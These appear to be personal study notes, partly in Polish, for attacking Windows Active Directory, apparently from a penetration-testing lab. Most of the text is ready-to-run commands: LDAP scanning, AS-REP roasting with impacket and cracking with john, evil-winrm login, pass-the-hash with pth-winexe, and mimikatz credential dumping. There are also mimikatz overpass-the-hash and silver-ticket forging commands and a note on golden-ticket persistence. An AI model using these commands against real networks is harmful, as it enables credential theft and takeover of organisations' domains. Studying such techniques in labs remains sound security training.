
1) Scans and basics

a) if there is LDAP: 
	nmap -n -sV --script "ldap*" -p 389 10.129.10.190 



2) geting creds or checkig vulns  (get to work)


	#impacket-GetNPUsers SOMe-DOMAIN-NAME.LOCAL/ -usersfile  users.txt -outputfile hashes.txt -dc-ip  10.129.10.190
		users.txt - file with users from www page or mails ets
		after geting hashes you can: #john --wordlist=rockou ./hashes.txt



3) loging 

 connect using hashes:
	#evil-winrm -i 10.129.10.190 -u userName -p Passwors


---------------------------------------------------------------------------------------------------------


traditional approach:
	cmd.exe: 
		>net user
		>net user /domain

	mozna juz po wykryciu uzykownikow tez ich spradzic:
		>net user jeff_admin /domain
		
		>net group /domain

---------------------------------------------------------------------------------------------------------
a modern approach
	cmd.exe
	>powershell
	uzywa sie protokolu LDAP do odpytania wpisac aby dostac domene i DC:
		>domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
 
		$PDC = ($domainObj.PdcRoleOwner).Name
		$SearchString = "LDAP://"
		$SearchString += $PDC + "/"
		$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
		$SearchString += $DistinguishedName
		New-Object System.DirectoryServices.DirectoryEntry($SearchString, "jeff_admin", "Qwerty09!") 

	skrypty sa w katalog i nazywaja sie enumerateAD.ps1
		i tak np jak chcemy znalesc i wyswitlic nazwy grup to zmieniamy linijke z "Searcher.filter": $Searcher.filter="(objectClass=Group)"
				a jak chcemy juz tylko info o grupie to: $Searcher.filter="(objectClass=Secret_Group)"

---------------------------------------------------------------------------------------------------------
currently loged on users:



---------------------------------------------------------------------------------------------------------

pass the hash - jesli jest logowanie ntlm to mozna pass the hash : 
	kali@kali:~$ pth-winexe -U offsec%aad3b435b51404eeaad3b435b51404ee:2892d26cdf84d7a70e2eb3b9f05c425e //10.11.0.22 cmd 
	

over pass the hash:  (TGT ) dla kerberso mozna uzyskac ntlm hash   - turn ntlm hash into kerberos ticket 
	C:\Tools\active_directory> mimikatz.exe
	mimikatz # privilege::debug
	Privilege '20' OK
	mimikatz # sekurlsa::logonpasswords

	I teraz mozna sie zalogowac
	mimikatz # sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d87aa966c327 /run:PowerShell.exe
	
	
Pass the ticket: to jest do tgs - (TGS - ticket granting service/server ?)	- silver ticket moze byc stworzony przez mimkatz. not giving priviliges but flexibility.
	mimikatz # kerberos::purge
	Ticket(s) purge for current session is OK
	mimikatz # kerberos::list
	mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt


Distributed Component Object Model   - DCOM  
	dla worskations bo wymaga offica -  robi sie makro w exelu 



Persistance: aby nie zgubic polaczenie (nie rozlaczyc sie)  z active directory to mozna probowac golden tickets. Mozna stworzyc wlasny tgt.
		- mozna tez ukrasc hashe wszystkich userow. 




